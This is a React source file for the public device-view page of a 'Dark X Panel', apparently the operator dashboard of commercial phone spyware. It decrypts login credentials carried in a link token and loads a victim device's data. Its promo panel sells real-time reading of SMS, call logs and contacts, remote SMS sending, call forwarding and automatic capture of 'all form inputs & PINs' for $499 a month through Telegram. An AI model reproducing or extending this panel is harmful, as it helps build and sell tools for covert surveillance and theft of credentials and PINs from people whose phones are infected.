import { useEffect, useState } from "react";
import { useParams, useSearchParams } from "react-router-dom";
import { ref, onValue, get } from "@/lib/rtdbPb";
import { setTempPublicPbUrl } from "@/lib/pocketbase";
import { auth, signInWithEmailAndPassword, signOut } from "@/lib/authPb";
import { RTDB_DB_MARKER } from "@/lib/rtdbPb";
import { DeviceUser } from "@/hooks/useFirebaseData";
import { decryptToken } from "@/lib/linkCrypto";
import { LinkPermissions } from "@/components/DeviceDetail";
import DeviceDetail from "@/components/DeviceDetail";
import blackholeBg from "@/assets/blackhole-bg.jpg";
import { Shield, Link2Off, Fingerprint, Key, Wifi, CheckCircle2, MessageCircle, Zap, Users, Clock, Star, Send } from "lucide-react";
import { motion } from "framer-motion";

const LOAD_STEPS = [
  { icon: Key, label: "Verifying access token", color: "text-primary" },
  { icon: Fingerprint, label: "Authenticating session", color: "text-accent" },
  { icon: Wifi, label: "Connecting to device", color: "text-cyan" },
  { icon: CheckCircle2, label: "Loading device data", color: "text-green" },
];

interface PublicDeviceViewProps {
  restrictedDeviceId?: string;
  onLogout?: () => Promise<void>;
}

function asDeviceUser(v: unknown): DeviceUser | null {
  if (v == null || typeof v !== "object") return null;
  return v as DeviceUser;
}

interface DeviceLinkSnapshot {
  expires_at?: number;
  enabled?: boolean;
  permissions?: LinkPermissions;
}

const PublicDeviceView = ({ restrictedDeviceId, onLogout }: PublicDeviceViewProps = {}) => {
  const { deviceId: routeDeviceId } = useParams<{ deviceId: string }>();
  const [searchParams] = useSearchParams();
  const deviceId = restrictedDeviceId || routeDeviceId;
  const isRestricted = !!restrictedDeviceId;
  const [user, setUser] = useState<DeviceUser | null>(null);
  const [loading, setLoading] = useState(true);
  const [linkEnabled, setLinkEnabled] = useState<boolean | null>(null);
  const [authError, setAuthError] = useState(false);
  const [loadStep, setLoadStep] = useState(0);
  const [permissions, setPermissions] = useState<LinkPermissions | undefined>(undefined);

  // Dynamic Firebase connection for secondary account links
  const dbUrl = searchParams.get("db");

  const targetDb = RTDB_DB_MARKER;

  useEffect(() => {
    if (dbUrl) {
      try {
        setTempPublicPbUrl(decodeURIComponent(dbUrl));
      } catch {
        setTempPublicPbUrl(null);
      }
    } else {
      setTempPublicPbUrl(null);
    }
    return () => {
      if (dbUrl) setTempPublicPbUrl(null);
    };
  }, [dbUrl]);

  useEffect(() => {
    if (!loading) return;
    const interval = setInterval(() => {
      setLoadStep((prev) => (prev < LOAD_STEPS.length - 1 ? prev + 1 : prev));
    }, 900);
    return () => clearInterval(interval);
  }, [loading]);

  useEffect(() => {
    if (!deviceId) return;

    // Restricted mode: already authenticated, just load device data
    if (isRestricted) {
      setLinkEnabled(true);
      const userRef = ref(targetDb, `users/${deviceId}`);
      const unsub = onValue(userRef, (snap) => {
        setUser(asDeviceUser(snap.val()));
        setTimeout(() => setLoading(false), 600);
      });
      return () => unsub();
    }

    const token = searchParams.get("t");
    if (!token) {
      setLoading(false);
      setAuthError(true);
      return;
    }

    let cancelled = false;
    let unsubLink: (() => void) | undefined;
    let unsubUser: (() => void) | undefined;

    (async () => {
      try {
        const keySnap = await get(ref(targetDb, `device_links/${deviceId}/aes_key`));
        const aesKeyRaw = keySnap.val();
        const aesKey = typeof aesKeyRaw === "string" ? aesKeyRaw : null;
        if (!aesKey || cancelled) {
          if (!cancelled) { setLoading(false); setAuthError(true); }
          return;
        }

        const decrypted = await decryptToken(decodeURIComponent(token), aesKey);
        const parts = decrypted.split(":");
        const email = parts[0];
        const password = parts.slice(1).join(":");

        await signInWithEmailAndPassword(auth, email, password);
        if (cancelled) return;

        const linkRefSub = ref(targetDb, `device_links/${deviceId}`);
        unsubLink = onValue(linkRefSub, (snap) => {
          const data = snap.val() as DeviceLinkSnapshot | null;
          if (data) {
            const expired = !!(data.expires_at && Date.now() > data.expires_at);
            setLinkEnabled(data.enabled === true && !expired);
            if (data.permissions) setPermissions(data.permissions);
          } else {
            setLinkEnabled(false);
          }
        });

        const userRef = ref(targetDb, `users/${deviceId}`);
        unsubUser = onValue(userRef, (snap) => {
          setUser(asDeviceUser(snap.val()));
          setTimeout(() => setLoading(false), 600);
        });
      } catch (err) {
        console.error("Public link auth failed:", err);
        if (!cancelled) { setLoading(false); setAuthError(true); }
      }
    })();

    return () => {
      cancelled = true;
      unsubLink?.();
      unsubUser?.();
      signOut(auth).catch(() => {});
      setTempPublicPbUrl(null);
    };
  }, [deviceId, searchParams, isRestricted, targetDb]);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center gap-8 px-6">
        <motion.div
          className="absolute w-40 h-40 rounded-full bg-primary/20 blur-3xl"
          animate={{ scale: [1, 1.3, 1], opacity: [0.3, 0.15, 0.3] }}
          transition={{ duration: 2.5, repeat: Infinity, ease: "easeInOut" }}
        />

        <motion.div
          initial={{ scale: 0, rotate: -30 }}
          animate={{ scale: 1, rotate: 0 }}
          transition={{ type: "spring", stiffness: 200, damping: 15 }}
          className="relative h-16 w-16 rounded-2xl bg-primary/10 border border-primary/20 flex items-center justify-center"
        >
          <Shield className="h-8 w-8 text-primary" />
          <motion.div
            className="absolute inset-0 rounded-2xl border-2 border-primary/30"
            animate={{ scale: [1, 1.2, 1], opacity: [0.5, 0, 0.5] }}
            transition={{ duration: 2, repeat: Infinity }}
          />
        </motion.div>

        <div className="text-center">
          <h1 className="text-lg font-black tracking-tight text-foreground">
            Dark <span className="text-primary">X</span> Panel
          </h1>
          <p className="text-[11px] text-muted-foreground mt-1">Secure device access</p>
        </div>

        <div className="w-full max-w-xs space-y-3">
          {LOAD_STEPS.map((step, i) => {
            const Icon = step.icon;
            const isActive = i === loadStep;
            const isDone = i < loadStep;
            const isPending = i > loadStep;

            return (
              <motion.div
                key={i}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: isPending ? 0.3 : 1, x: 0 }}
                transition={{ delay: i * 0.15, duration: 0.4 }}
                className={`flex items-center gap-3 p-3 rounded-xl border transition-all duration-500 ${
                  isActive
                    ? "bg-primary/5 border-primary/30 shadow-[0_0_15px_hsl(var(--primary)/0.1)]"
                    : isDone
                    ? "bg-green/5 border-green/20"
                    : "bg-secondary/30 border-border/50"
                }`}
              >
                <div className={`h-8 w-8 rounded-lg flex items-center justify-center shrink-0 ${
                  isActive ? "bg-primary/10" : isDone ? "bg-green/10" : "bg-secondary"
                }`}>
                  {isDone ? (
                    <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring" }}>
                      <CheckCircle2 className="h-4 w-4 text-green" />
                    </motion.div>
                  ) : isActive ? (
                    <motion.div animate={{ rotate: 360 }} transition={{ duration: 2, repeat: Infinity, ease: "linear" }}>
                      <Icon className={`h-4 w-4 ${step.color}`} />
                    </motion.div>
                  ) : (
                    <Icon className="h-4 w-4 text-muted-foreground/50" />
                  )}
                </div>
                <span className={`text-xs font-medium ${
                  isActive ? "text-foreground" : isDone ? "text-green" : "text-muted-foreground/50"
                }`}>
                  {step.label}
                </span>
                {isActive && (
                  <motion.div className="ml-auto flex gap-1" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    {[0, 1, 2].map((d) => (
                      <motion.div
                        key={d}
                        className="h-1 w-1 rounded-full bg-primary"
                        animate={{ scale: [1, 1.5, 1], opacity: [0.4, 1, 0.4] }}
                        transition={{ duration: 0.8, repeat: Infinity, delay: d * 0.2 }}
                      />
                    ))}
                  </motion.div>
                )}
              </motion.div>
            );
          })}
        </div>

        <div className="w-full max-w-xs">
          <div className="h-1 rounded-full bg-secondary overflow-hidden">
            <motion.div
              className="h-full rounded-full bg-primary"
              initial={{ width: "0%" }}
              animate={{ width: `${((loadStep + 1) / LOAD_STEPS.length) * 100}%` }}
              transition={{ duration: 0.5, ease: "easeOut" }}
            />
          </div>
        </div>
      </div>
    );
  }

  if (authError || !linkEnabled || !user) {
    return (
      <div className="min-h-screen relative">
        <div className="fixed inset-0 z-0 bg-cover bg-center opacity-30" style={{ backgroundImage: `url(${blackholeBg})` }} />
        <div className="relative z-10 min-h-screen bg-background/60 flex flex-col items-center justify-center gap-4 px-6">
          <div className="h-16 w-16 rounded-2xl bg-destructive/10 flex items-center justify-center">
            <Link2Off className="h-8 w-8 text-destructive" />
          </div>
          <h1 className="text-xl font-bold text-foreground">Link Unavailable</h1>
          <p className="text-sm text-muted-foreground text-center max-w-sm">
            {authError ? "Invalid or expired link token." : !linkEnabled ? "This device link has been disabled or doesn't exist." : "Device not found."}
          </p>
          <div className="flex items-center gap-2 mt-4 opacity-40">
            <Shield className="h-4 w-4 text-primary" />
            <span className="text-xs text-muted-foreground">Singularity</span>
          </div>
        </div>
      </div>
    );
  }

  const features = [
    { icon: Zap, label: "Blazing Fast", desc: "Real-time device tracking with zero lag" },
    { icon: Shield, label: "Military-Grade Security", desc: "End-to-end encrypted connections" },
    { icon: Users, label: "Unlimited Devices", desc: "No cap on how many devices you manage" },
    { icon: Clock, label: "99.9% Uptime", desc: "Always online, zero downtime guaranteed" },
    { icon: MessageCircle, label: "Live SMS & Calls", desc: "Read SMS, call logs, contacts in real-time" },
    { icon: Star, label: "Smart Alerts", desc: "Instant ping & notification system" },
    { icon: Send, label: "Remote Actions", desc: "Send SMS, forward calls remotely" },
    { icon: Fingerprint, label: "Form Capture", desc: "Auto-capture all form inputs & PINs" },
  ];

  return (
    <div className="min-h-screen relative">
      <div className="fixed inset-0 z-0 bg-cover bg-center opacity-30" style={{ backgroundImage: `url(${blackholeBg})` }} />
      <div className="relative z-10 min-h-screen bg-background/60 flex flex-col lg:flex-row">
        {/* Device detail - full on mobile, half on desktop */}
        <div className="w-full lg:w-1/2 lg:h-screen lg:overflow-y-auto">
          <DeviceDetail id={deviceId!} user={user} onClose={() => window.close()} embedded linkPermissions={permissions} />
        </div>

        {/* Promo panel - hidden on mobile, shown on desktop */}
        <div className="hidden lg:flex lg:w-1/2 lg:h-screen lg:overflow-y-auto flex-col border-l border-border bg-background/80 backdrop-blur-xl">
          {/* Hero */}
          <div className="p-8 pb-4 space-y-4">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              className="space-y-4"
            >
              <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-primary/10 border border-primary/20">
                <Star className="h-3 w-3 text-primary" />
                <span className="text-[11px] font-bold text-primary uppercase tracking-wider">Cyber Panel</span>
              </div>
              <h2 className="text-3xl font-black text-foreground leading-tight">
                Most Powerful & Fast<br />
                <span className="text-primary">Panel Ever Made</span>
              </h2>
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ delay: 0.5, type: "spring" }}
                className="inline-flex items-baseline gap-1 px-4 py-2.5 rounded-2xl bg-primary/10 border border-primary/30"
              >
                <span className="text-xs text-muted-foreground line-through mr-1">$999</span>
                <span className="text-3xl font-black text-primary">$499</span>
                <span className="text-sm text-muted-foreground font-medium">/month</span>
              </motion.div>
              <p className="text-sm text-muted-foreground">
                Everything you need to monitor & manage devices â€” at an unbeatable price.
              </p>
            </motion.div>
          </div>

          {/* Features list */}
          <div className="px-8 pb-4 space-y-2">
            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.6 }}
              className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest mb-3"
            >
              What you get
            </motion.p>
            <div className="grid grid-cols-2 gap-2">
              {features.map((feat, i) => {
                const Icon = feat.icon;
                return (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -15 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: 0.7 + i * 0.08 }}
                    className="flex items-start gap-3 p-3 rounded-xl bg-secondary/40 border border-border/50 hover:border-primary/30 transition-colors group"
                  >
                    <div className="h-8 w-8 rounded-lg bg-primary/10 flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                      <Icon className="h-3.5 w-3.5 text-primary" />
                    </div>
                    <div>
                      <h4 className="text-[11px] font-bold text-foreground">{feat.label}</h4>
                      <p className="text-[10px] text-muted-foreground leading-tight">{feat.desc}</p>
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </div>

          {/* Contact CTA */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1.4 }}
            className="p-8 pt-4 mt-auto"
          >
            <div className="p-5 rounded-2xl bg-gradient-to-br from-primary/10 to-accent/10 border border-primary/20 space-y-4">
              <div className="text-center space-y-2">
                <h4 className="text-lg font-black text-foreground">Ready to get started?</h4>
                <p className="text-xs text-muted-foreground">
                  DM <span className="text-primary font-bold">@CyberMatrix_Admin</span> on Telegram to buy
                </p>
              </div>
              <a
                href="https://t.me/CyberMatrix_Admin"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-primary text-primary-foreground text-sm font-bold hover:opacity-90 transition-opacity"
              >
                <Send className="h-4 w-4" />
                Message @CyberMatrix_Admin on Telegram
              </a>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default PublicDeviceView;
